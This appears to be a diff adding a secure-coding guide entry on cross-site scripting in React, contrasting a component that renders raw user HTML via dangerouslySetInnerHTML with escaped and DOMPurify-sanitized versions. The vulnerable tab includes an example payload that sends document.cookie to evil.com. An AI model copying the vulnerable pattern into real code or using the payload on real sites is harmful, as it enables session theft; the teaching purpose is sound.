@@ -1,0 +1,29 @@
+{
+  "type": "tabs",
+  "tabs": [
+    {
+      "label": "DON'T: XSS Vulnerability",
+      "blocks": [
+        {
+          "type": "code",
+          "language": "typescript",
+          "filename": "src/components/Comment.tsx",
+          "description": "Using dangerouslySetInnerHTML with user content allows attackers to inject script tags that steal cookies, redirect users, or deface your site.",
+          "code": "function Comment({ comment }: { comment: { body: string } }) {\n  // VULNERABLE: renders raw HTML from user input\n  return (\n    <div\n      className=\"comment\"\n      dangerouslySetInnerHTML={{ __html: comment.body }}\n    />\n  );\n}\n\n// An attacker submits this as their comment body:\n// <img src=x onerror=\"fetch('https://evil.com/steal?cookie='+document.cookie)\">"
+        }
+      ]
+    },
+    {
+      "label": "DO: Sanitized Rendering",
+      "blocks": [
+        {
+          "type": "code",
+          "language": "typescript",
+          "filename": "src/components/Comment.tsx",
+          "description": "Let React escape by default, or use a sanitization library like DOMPurify when you genuinely need to render HTML.",
+          "code": "import DOMPurify from \"dompurify\";\n\n// Option 1: Let React handle escaping (preferred for plain text)\nfunction Comment({ comment }: { comment: { body: string } }) {\n  // React automatically escapes this -- no XSS possible\n  return <div className=\"comment\">{comment.body}</div>;\n}\n\n// Option 2: When you need to render rich HTML (e.g., from a markdown editor)\nfunction RichComment({ comment }: { comment: { html: string } }) {\n  // DOMPurify strips dangerous tags and attributes\n  const sanitized = DOMPurify.sanitize(comment.html, {\n    ALLOWED_TAGS: [\"b\", \"i\", \"em\", \"strong\", \"a\", \"p\", \"br\", \"ul\", \"li\"],\n    ALLOWED_ATTR: [\"href\", \"target\", \"rel\"],\n  });\n\n  return (\n    <div\n      className=\"comment\"\n      dangerouslySetInnerHTML={{ __html: sanitized }}\n    />\n  );\n}"
+        }
+      ]
+    }
+  ]
+}
